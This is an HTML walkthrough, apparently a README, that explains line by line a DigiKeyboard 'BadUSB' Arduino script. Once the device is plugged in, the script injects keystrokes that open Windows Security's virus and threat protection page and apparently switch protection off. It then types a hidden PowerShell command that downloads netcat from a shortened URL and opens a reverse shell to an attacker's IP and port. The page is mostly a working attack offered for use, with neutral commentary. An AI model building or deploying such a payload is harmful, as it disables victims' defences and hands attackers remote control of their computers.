<h2 color="#00979C"> <div align="center"><i>This script uses the DigiKeyboard library to automate keystrokes and input text Here is a breakdown of each line of code:</i></div></h2>

<h2<code>#include "DigiKeyboard.h"</code></h2>
<p>This line includes the header file "DigiKeyboard.h," which provides the necessary definitions and functions for interacting with the DigiKeyboard.</p>

<code>void setup(){</code>
<p>This marks the beginning of the setup() function, which is a special function in Arduino that is called once when the board is powered on or reset.</p>

<code>DigiKeyboard.delay(1000);</code>
<p>This line introduces a delay of 1000 milliseconds (1 second) in the program execution.</p>

<code>DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);</code>
<p>This line simulates pressing the 'S' key along with the left GUI (Windows key) modifier using the sendKeyStroke() function.</p>

<code>DigiKeyboard.delay(1000);</code>
<p>Another delay of 1000 milliseconds is introduced.</p>

<code>DigiKeyboard.print("virus & threat protection");</code>
<p>The print() function is used to simulate typing the string "virus & threat protection" as keystrokes.</p>

<code>DigiKeyboard.delay(500);</code>
<p>A delay of 500 milliseconds (0.5 seconds) is added.</p>

<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
<p>The sendKeyStroke() function is used to simulate pressing the Enter key.</p>

<code>DigiKeyboard.delay(5000);</code>
<p>A delay of 5000 milliseconds (5 seconds) is introduced.</p>

<code>DigiKeyboard.sendKeyStroke(43);</code>
<p>The sendKeyStroke() function is used to simulate tapping a key with the code 43. The specific key associated with code 43 may vary depending on the keyboard layout.</p>

<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
<p>Another Enter key press is simulated.</p>

<code>DigiKeyboard.delay(700);</code>
<p>A delay of 700 milliseconds (0.7 seconds) is added.</p>

<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
<p>Another Enter key press is simulated.</p>

<code>DigiKeyboard.delay(700);</code>
<p>Another delay of 700 milliseconds is introduced.</p>

<code>  DigiKeyboard.sendKeyStroke(KEY_SPACE);</code>
<p>The sendKeyStroke() function is used to simulate pressing the Space key.</p>

<code>DigiKeyboard.delay(2000);</code>
<p>A delay of 2000 milliseconds (2 seconds) is added.</p>

<code>DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);</code>
<p>The sendKeyStroke() function is used to simulate pressing the 'Y' key along with the left Alt modifier.</p>

<code>DigiKeyboard.delay(1000);</code>
<p>A delay of 1000 milliseconds (1 second) is introduced.</p>

<code>DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);</code>
<p><The sendKeyStroke() function is used to simulate pressing the F4 key along with the left Alt modifier. This combination is often used to close the active window in Windows./p>
  
<code>  DigiKeyboard.delay(500);</code>
<p>A delay of 500 milliseconds (0.5 seconds) is added.</p>

<code>DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);</code>
<p>The sendKeyStroke() function is used to simulate pressing the 'R' key along with the left GUI (Windows key) modifier.</p>

<code>DigiKeyboard.delay(700);</code>
 <p>A delay of 700 milliseconds (0.7 seconds) is introduced.</p>

<code>DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");</code>
<p>The print() function is used to simulate typing the provided string, which contains a PowerShell command.</p>
  
<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
<p>The sendKeyStroke() function is used to simulate pressing the Enter key.</p>

<code>void loop(){}</code>
<p>This is the loop() function, which runs repeatedly after the setup() function. However, in this code, the loop() function is empty, so it doesn't contain any specific instructions</p>
